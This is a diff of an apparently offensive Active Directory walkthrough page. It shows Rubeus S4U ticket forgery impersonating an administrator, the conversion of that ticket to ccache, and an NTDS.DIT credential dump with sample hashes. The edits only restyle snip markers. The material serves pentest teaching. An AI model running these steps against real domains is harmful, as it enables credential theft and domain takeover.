@@ -240,7 +240,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the DRSUAPI method to get NTDS.DIT secrets
 </span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
-</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up...
 </span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-import-modules">1. Import Modules</h4>
 <div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
@@ -354,7 +354,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] TGT request successful!
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFuDCCBb ...[SNIP]... VyLmh0Yg==
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFuDCCBb ---[SNIP]--- VyLmh0Yg==
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: S4U
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
@@ -365,7 +365,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Got a TGS for 'administrator' to 'EvilComputer$@EXAMPLE.COM'
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGCjCCBg ...[SNIP]... 1wdXRlciQ=
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGCjCCBg ---[SNIP]--- 1wdXRlciQ=
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Impersonating user 'administrator' to target SPN 'cifs/dc.example.com'
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Building S4U2proxy request for service: 'cifs/dc.example.com'
@@ -374,12 +374,12 @@
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] S4U2proxy success!
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi) for SPN 'cifs/dc.example.com':
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGujCCBr ...[SNIP]... VyLmh0Yg==
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGujCCBr ---[SNIP]--- VyLmh0Yg==
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] Ticket successfully imported!
 </span></span></span></div></pre></div><h4 id="7-convert-to-ccache-format">7. Convert to ccache format</h4>
 <div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 rubeustoccache.py '<span class="o editable-keyword">&lt;BASE64_TICKET&gt;</span>' secrets.kirbi secrets.ccache
 </span></span></span></code><div class="output-bubble">Sample Output:
-<span class="line"><span class="cl"><span class="gp">$</span> python3 rubeustoccache.py <span class="s1">'doIGujCCBr ...[SNIP]... VyLmh0Yg=='</span> secrets.kirbi secrets.ccache
+<span class="line"><span class="cl"><span class="gp">$</span> python3 rubeustoccache.py <span class="s1">'doIGujCCBr ---[SNIP]--- VyLmh0Yg=='</span> secrets.kirbi secrets.ccache
 </span></span><span class="line"><span class="cl"><span class="go">╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
 </span></span></span><span class="line"><span class="cl"><span class="go">╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
 </span></span></span><span class="line"><span class="cl"><span class="go">╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
@@ -422,7 +422,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the DRSUAPI method to get NTDS.DIT secrets
 </span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
-</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up...
 </span></span></span></div></pre></div></div></div>
 
